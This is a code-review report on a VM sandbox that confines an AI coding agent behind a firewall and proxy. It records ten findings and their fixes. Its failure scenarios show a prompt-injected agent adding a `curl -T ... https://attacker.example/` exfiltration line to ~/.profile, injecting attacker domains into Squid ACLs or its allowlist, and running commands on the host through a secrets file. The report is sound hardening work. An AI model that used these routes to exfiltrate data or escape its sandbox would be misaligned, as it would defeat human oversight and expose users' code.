# code-vm Code Review Findings

**Date:** 2026-07-31
**Scope:** the whole implementation as of commit `982c3c9` — Go packages under
`internal/` and `cmd/`, guest scripts under `internal/guest/files/`, the Lima
template, `test-vm-sandbox.sh`, `mise.toml`, and the CI workflow. The `docs/`
tree was excluded.
**Method:** workflow-backed review at high effort — parallel finders per
correctness angle, then an independent adversarial verifier per candidate
location. 35 agents; all ten findings below survived verification as
`CONFIRMED`. Line references were re-checked against the working tree after the
review completed.
**Status:** every finding is addressed — 1, 3, 4, 5, 6, 7, 8, 9 and 10 **fixed**,
2 **closed by removal**. Finding 9's fix is a manually dispatched CI job rather
than a push trigger, so the gap it describes is narrowed rather than closed until
that job has proven it runs on a GitHub runner. Each section below carries its
own status line; `git log` has the commits.

**Plus one issue the review did not surface.** `.sandbox-secrets.yaml` was read
from the agent-writable workspace and its `source:` values executed **on the
host** via `bash -c` (`ResolveSecrets` → `ExecHost`), so an agent that wrote that
file got host command execution on the next `code-vm` invocation in that
directory — the same class as finding 7 but categorically worse, because it fails
*outside* the VM boundary rather than inside it. It was inherited from the
container sandbox, which resolves secrets the same way.

Reviewing it also showed the mechanism's protection did not hold: rendered files
were `root:devuser 0444`, group-readable by the agent, and the generated deny
rules only match commands where the path appears as a separate token, which
`python -c` (allowed by the shipped profile) sidesteps. So the cost was a
host-execution hole and the benefit was a property that was not true.

**The mechanism was removed** rather than repaired, which also closed finding 2.
See *Credential injection — removed* in the design doc for what a replacement
must do differently.

## The pattern

Most findings are **regressions relative to the Docker sandbox**, not novel
bugs: places where porting a control from `entrypoint.sh` into
`sandbox-boot.service` silently dropped a property the container version had.
Findings 1 and 4 were the clearest cases — an unfiltered-egress window and a
firewall check that stopped being fatal. Both turned out to be worse than the
review described once examined. Finding 3 is the exception: a genuine
port bug, where a group name was assumed to exist because it happened to on the
development host. Finding 9 was a decision rather than a defect.

---

## 1. Agent-writable rc files execute pre-firewall at every boot

**`internal/guest/files/scripts/update-agent-clis.sh:20`** — severity: high —
**FIXED**

*The review understated this.* Alongside the login shell it names, the same
function set `PATH` with the agent's own `~/.local/bin` **first**, so the `curl`
and `bash` in `curl -fsSL … | bash` resolved through a directory the agent
writes. A planted `~/.local/bin/curl` ran pre-firewall just as readily as a
planted `~/.profile`, and dropping `-l` alone would have left that open. Both
were confirmed by planting canaries and running the real script:

```
VECTOR A FIRED: agent ~/.profile executed pre-firewall
VECTOR B FIRED: agent ~/.local/bin/curl executed pre-firewall
```

*Fix as applied:* `bash -c` instead of `-lc`; a PATH of system directories only
(the installers write into `$HOME` regardless of what is on PATH); and
`BASH_ENV`/`ENV` cleared, since those are the one file a non-interactive shell
still sources. After the change both canaries stayed unfired and both installers
still completed without warnings. The suite now plants the same two canaries,
runs the update script, and asserts neither fires — a behavioural guard rather
than a check that the script merely looks right.

*Also fixed in passing:* OpenCode was installed to `~/.opencode/bin`, which was
on no PATH the agent ever saw, so the install was pointless. That directory is
now in `sandbox-exec`'s PATH and the suite asserts the agent can run both CLIs —
nothing had verified they were usable at all.

*Not adopted:* moving the CLI update to after the firewall, which would remove
the unrestricted window entirely rather than fencing it off. Every domain the
installers use is already allowlisted, so it is plausible, but it would need
proxy environment plumbed into this step and would turn a vendor changing a
download host into a failed update. Worth revisiting; the window now only runs
vendor code, which installing their CLI implies trusting anyway.

`run_as_agent` invokes `bash -lc`, a **login** shell, which sources
`/home/devuser/.profile` and `.bashrc`. Those files are owned by the agent and
writable by it during any normal session. `sandbox-boot.sh` runs this script
first, before `init-firewall.sh` — deliberately, because the installers need
egress — so anything in those rc files runs with **no iptables policy and no
Squid**.

*Failure scenario:* a prompt-injected agent appends
`curl -T /home/devuser/repos/secret.tar https://attacker.example/` to
`~/.profile`. On the next `code-vm stop` / `code-vm start`, that command runs
with completely unfiltered egress. The allowlist never sees the traffic and
`proxy-log` shows nothing.

*Note:* the original direction — "drop `-l`, it's the cheap targeted change" —
would have fixed the named symptom and left the PATH vector wide open. Worth
remembering when a finding names one instance of a pattern.

## 2. Credential deny rules are lost on restart while the secrets persist

**`internal/session/credentials.go:18`**, with the consuming side at
**`internal/guest/files/scripts/lock-settings.sh:80`** — severity: high —
**CLOSED BY REMOVAL**

*Resolution:* credential injection was removed entirely (see the status note at
the top), so there are no deny rules and no rendered credential files whose
lifetimes could disagree. The `CRED_DENY` branch in `lock-settings.sh` is gone.
Had the mechanism been kept, this would still have needed a decision between
persisting the rules and removing the rendered files.

`denyRulesPath` lives under `/run/sandbox-secrets/`, which is tmpfs, but the
*rendered credential files* are written to the guest disk (`root:devuser 0444`)
and survive reboots. The two lifetimes disagree.

*Failure scenario:* a session in workspace A renders
`/home/devuser/.gradle/gradle.properties` and merges its deny rules. After a VM
restart, a session in workspace B runs `lock-settings.sh`, which finds no
`deny-rules.json` and writes `settings.json` **without** the deny patterns — the
credential file is still on disk and group-readable, and Claude Code may now
read it.

*Fix direction:* either persist the deny rules alongside the rendered files, or
have the render step remove rendered credentials whose deny rules are gone, so
the file and its protection share one lifetime.

## 3. Host GID collision leaves no `devuser` group and bricks the VM

**`internal/guest/files/scripts/provision-system.sh:24`** — severity: high
(availability) — **FIXED**

*Fix as applied:* the group-creation logic was right — `useradd -g <gid>` only
needs *a* group with that GID to exist, whatever it is called. The defect was in
every consumer that then assumed the group was named `devuser`. Those now set
group ownership by numeric GID: `chown "root:${AGENT_GID}"` and
`install -g "$AGENT_GID"` in `lock-settings.sh`, and `session.Deps` carries
`AgentUID`/`AgentGID` so the Go side installs with numeric ids too. Creating a
second group with a duplicate GID was rejected as the fix: `stat -c %G` would
still report the pre-existing name, so the confusion would remain and the suite
assertions would fail on a correct guest. Provisioning also now fails loudly if
a *different* account already holds the host UID, instead of dying on a cryptic
`useradd` error. The suite compares `%U:%g` numerically for the same reason.

*Verified against the real failure,* by running both versions of
`lock-settings.sh` in the guest against a user whose primary group is the
pre-existing `users` (GID 100):

```
old: FAILED -> install: invalid group: 'collideuser'
new: SUCCEEDED -> settings owned root:users (gid 100) 444
```

`getent group "$AGENT_GID"` tests for a group with that **GID**, not one named
`devuser`. When the host user's primary GID already exists in the guest —
gid 100 (`users`) on many Linux distros, gid 20 on macOS hosts — `groupadd` is
skipped, so no group *named* `devuser` ever exists. Every later
`chown root:devuser` and `install -g devuser` then fails with "invalid group".

*Failure scenario:* a host user with GID 100 runs `code-vm start`.
`lock-settings.sh` dies at its first `chown` under `set -e`,
`/run/firewall-verify` is never written, and `limactl start` hangs until the
300 s readiness probe times out. The VM never becomes usable, with no clear
diagnostic.

*Note:* this did not surface during implementation only because the development
host's GID (1000) happens not to collide.

*Note:* the fix went further than the original direction suggested — rather than
resolving the group's name and threading it through, no consumer refers to the
group by name at all.

## 4. Firewall self-verification fails open instead of closed

**`internal/guest/files/scripts/init-firewall.sh:251`** (verify file written) vs
**`:254`** (`VERIFY_OK` gate) — severity: high — **FIXED**

*Fix as applied:* the verify file is written only after every check passes, so its
existence is a real success signal and a failed verification withholds the
readiness signal entirely — the equivalent of the container dying. It also gained
a `VERIFY=ok` first line. Because the probe would otherwise only notice by timing
out after 300 s, `sandbox-boot.sh` now traps `ERR` and touches
`/run/sandbox-boot-failed`, which the probe watches so a broken boot fails
immediately and names the step.

*Verified empirically,* not just by reading: patching one `has_rule` check in a
copy of the live script to expect a nonexistent rule produced `exit=1`, the
message `the DNS-tunneling UDP drop is missing`, and no verify file. The probe
loop with the marker present exited non-zero in 0 s rather than 300 s.

The script writes `/run/firewall-verify` **before** it evaluates `VERIFY_OK` and
exits 1. The Lima readiness probe only checks that the file *exists*. In the
Docker sandbox the identical `exit 1` aborted `entrypoint.sh` under `set -e`, so
the container died and the agent never ran.

*Failure scenario:* a verification check stops matching (e.g. an iptables output
format change). `init-firewall.sh` exits 1 and `sandbox-boot.service` fails —
but the verify file already exists, the probe passes, `limactl start` reports
success, and `code-vm` runs Claude in a VM whose firewall failed its own
verification. Nothing host-side reads the file's *contents*; only the
informational `status` and `firewall` commands do.

*Note:* the fix was to withhold the readiness signal, never to relax a check.

## 5. The gateway-REJECT check is satisfied by the Squid ACCEPT rule

**`internal/guest/files/scripts/init-firewall.sh:236`** — severity: medium — **FIXED**

*Fix as applied:* every check now matches a whole rule line from `iptables -S`
via `grep -qxF`, so no other rule can satisfy it. The proxy-egress check had the
identical weakness and was fixed with it. The suite additionally asserts the four
rule specs directly against `iptables -S`, independent of the guest's
self-report — the previous assertions only confirmed that the guest said "yes".

One thing worth recording: the first version of this fix routed each check
through a helper called in a command substitution, where `VERIFY_OK=false` would
have been set in a subshell and discarded — the verification would have passed
unconditionally, reintroducing finding 4 while appearing to fix finding 5. The
checks are spelled out individually for that reason.

`gw_reject` greps for any line containing `owner UID match $AGENT_UID`. The
agent-to-Squid ACCEPT rule appended earlier (`:192`) matches that string too, so
the check reports `yes` whether or not the gateway REJECT rule exists.

*Failure scenario:* the REJECT rule is dropped by a refactor or an iptables
failure. `/run/firewall-verify` still says `AGENT_GATEWAY_REJECT=yes`, the suite
assertion still passes, and the agent can reach host services while both the
security suite and `code-vm status` report the protection as active.

*Fix direction:* match the rule specifically — include the target and the
gateway address in the grep, not just the UID-owner match.

## 6. Predictable `/tmp` staging paths allow ACL injection

**`internal/session/allowlist.go:111`**, same pattern at
**`internal/session/gitidentity.go:63`** — severity: medium — **FIXED in `7b5209b`**

*Fix as applied:* all three call sites (allowlist, git identity, credentials) now
go through `session.installContent`, which stages under
`/home/limaadmin/.code-vm-staging` — created `0700` and owned by the admin user,
so the agent cannot enter it — with a `crypto/rand` filename. It cannot be a
root-only directory because `limactl copy` authenticates as the Lima guest user.
`stage_test.go` pins the staging location, the mode, and the post-install
cleanup; the suite asserts the agent cannot read the staging directory.

Files are staged into the guest at deterministic, agent-writable paths:
`/tmp/10-<sha256-prefix>.conf` and `/tmp/code-vm-gitconfig`. Root then
`install`s them into place. The window between `limactl copy` and `install` is a
race the agent can win.

*Failure scenario:* an agent already running in the VM computes the workspace
hash, then rewrites the staged fragment with
`acl allowed_domains dstdomain .attacker.com` after the copy but before the
install. `squid -k reconfigure` loads attacker-chosen ACLs.

*Fix direction:* stage into a root-only directory (e.g. under `/run/sandbox/`
created `0700 root:root`), or use an unpredictable per-invocation filename.

## 7. `.sandbox-domains` is agent-authored input that widens the allowlist

**`internal/session/allowlist.go:81`** — severity: medium — **FIXED in `7b5209b`**

`ApplyAllowlist` reads `.sandbox-domains` from the workspace, which is mounted
writable and is exactly what the agent edits. An agent can therefore author its
own allowlist entry and have the next `code-vm` invocation install it as root.

*Failure scenario:* the agent writes `.attacker.example` into
`<workspace>/.sandbox-domains`; the next session installs it and reloads Squid,
after which repository contents and rendered credential values can be POSTed
out, with only a proxy-log line as evidence.

*Fix as applied:* `.sandbox-domains` support was **removed** rather than
mitigated. The host config's `extraDomains` is now the only source; it lives
outside every mount, `MountsExclude` refuses to run when a mount would expose
it, and entries are validated against a domain pattern before they can reach
`squid.conf`. `code-vm allow` replaces the per-project file as the way to add a
domain, applying it live via the fragment. The cost accepted: a project can no
longer record its required domains in its own repo for teammates.

## 8. Every firewall mode switch wipes the Squid audit log

**`internal/guest/files/scripts/init-firewall.sh:129`** — severity: medium — **FIXED in `7b5209b`**

`install -m 0644 -o proxy -g proxy /dev/null /var/log/squid/access.log`
truncates the log on every run, and `set-firewall-mode.sh` re-execs
`init-firewall.sh` — so switching modes destroys the audit trail.

*Fix as applied:* the log is created only when absent. This became a
prerequisite rather than a nicety once `code-vm allow` started reading denied
entries out of that log. The suite compares line counts across an
`audit` → `allowlist` round trip.

*Failure scenario:* a user sees suspicious denied requests and runs
`code-vm firewall audit` to investigate. The switch truncates `access.log`, and
`code-vm proxy-log denied` shows nothing — the evidence the switch was meant to
help inspect is gone.

*Fix direction:* create the log only when absent (`[ -f ] ||`), or rotate rather
than truncate.

## 9. The security suite is excluded from CI on a stale premise

**`.github/workflows/ci.yml:3`** — severity: medium — **FIXED (manual trigger for now)**

*Fix as applied:* a second `vm-suite` job runs the full suite, gated to
`workflow_dispatch` only. It grants access to `/dev/kvm` via a udev rule,
installs `qemu-system-x86` and `virtiofsd` from apt and Lima 2.2.0 from its
release tarball, points `projectsRoot` at the checkout's parent so `code-vm` will
run there, and dumps the boot journal and cloud-init log on failure — first boot
is where this is most likely to break, and inside the guest is where the job log
cannot see it.

Manual rather than on push deliberately: GitHub's Linux runners expose
`/dev/kvm`, but whether this whole stack comes up on one has never been observed.
Dispatch it a few times; if it proves reliable, add `push`/`pull_request` to the
trigger and drop the `if`. Until then a PR can still regress a security control
and show green, so the gap this finding describes is narrowed, not closed.

*Also fixed:* `yq` is now pinned in `mise.toml`. The suite has always used it to
edit the host config, but nothing installed it — it worked locally only because
the machine happened to have one, and CI has none.

*And a false negative found while wiring this up:* `code-vm doctor` reported
`virtiofsd` missing on a host where it was installed and Lima was using it
happily. It checked only `PATH`, but distributions install it as a helper binary
outside `PATH` — `/usr/lib` on Debian and Ubuntu, `/usr/libexec` on Fedora.
`doctor` now checks those locations too, so the CI job can gate on it.

CI runs `fmt-check`, `lint`, `test:unit`, and `build`, but not
`mise run test:vm`. The sibling Docker sandbox runs its security suite on every
push/PR (see the parent repo's `CLAUDE.md`). The stated reason — GitHub-hosted
runners lack nested KVM — is out of date: GitHub's Linux runners have exposed
`/dev/kvm` since 2023.

*Failure scenario:* a PR that reorders `sandbox-boot.sh` so the firewall never
applies, or breaks the settings lock, passes CI green and merges. It ships in
the next VM users provision.

*Fix direction:* add a second job that runs `mise run test:vm` on
`ubuntu-latest` and see whether KVM is actually available; keep it non-blocking
at first if runtime is a concern.

## 10. No post-firewall connectivity check at boot

**`internal/guest/files/scripts/sandbox-boot.sh:19`** — severity: low — **FIXED**

*Fix as applied:* the boot sequence ends by reaching the API the way the agent
does — as the agent, through the proxy — and warns with a pointer to
`code-vm proxy-log denied` when it cannot. Running it as the agent rather than as
root is the point: root bypasses the proxy via its own ACCEPT rule, so a
root-side check would pass while the agent's path was broken. No `-f`, because
the API root answers 404 and any completed exchange proves the path works.

Non-fatal, and inside an `if` so the `ERR` trap added for finding 4 does not read
a warning as a failed boot — an offline start should warn, not withhold the VM.
Both paths were verified: a normal boot logs `API reachable through the proxy`
with no failure marker, and the same script pointed at a dead proxy port exits 0,
logs the warning, completes, and still leaves no marker.

*A trap worth recording:* `sandbox-boot.sh` did not source
`/etc/sandbox/provision.env`, so `$AGENT_UID` was unset. Under `set -u` that
would have aborted the boot and tripped the failure marker, making every VM
unusable — the check meant to diagnose breakage would have been the breakage. It
sources it now.

The container `entrypoint.sh` curled `https://api.anthropic.com` after the
firewall closed and printed an explicit warning on failure. The VM boot sequence
ends at `init-firewall.sh` with no such check, so a firewall that passes *rule*
verification but breaks actual *connectivity* is silent.

*Failure scenario:* DNS breaks under the new rules — e.g. the LIMADNS DNAT
parsing yields no allow rules on a Lima version whose nat-chain format differs.
Every iptables self-check still passes, the verify file is written, `code-vm`
starts normally, and every Claude API call hangs with no startup diagnostic.

*Original fix direction:* re-add the reachability probe as a final, non-fatal step with a
loud warning.

---

## Follow-ups

Nothing from the review is outstanding. Three things it surfaced are left as
deliberate decisions rather than defects:

1. **Promote the VM suite to run on push** once the dispatched job has shown it
   works on a GitHub runner. Until then a PR can regress a security control and
   still show green.
2. **Move the CLI update after the firewall**, removing the last unrestricted-egress
   window rather than fencing the agent out of it (finding 1). Needs proxy
   environment plumbed into that step, and makes a vendor changing a download
   host into a failed update.
3. **A replacement for credential injection**, if one is wanted. The design doc
   records what it must do differently: declare in host config, and either be
   honest that the agent can read the credentials or keep them out of the guest
   entirely.
